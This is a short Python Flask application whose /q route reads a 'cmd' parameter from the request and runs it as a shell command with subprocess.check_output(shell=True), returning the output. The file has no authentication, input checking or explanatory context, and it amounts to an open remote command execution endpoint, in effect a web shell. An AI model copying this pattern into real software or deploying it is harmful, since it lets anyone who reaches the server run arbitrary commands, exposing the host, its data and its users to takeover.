from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route("/")
def index():
    return "hello"


@app.route("/q")
def page():
    cmd = request.values.get("cmd")

    return subprocess.check_output(cmd, shell=True)


if __name__ == '__main__':
    app.run()
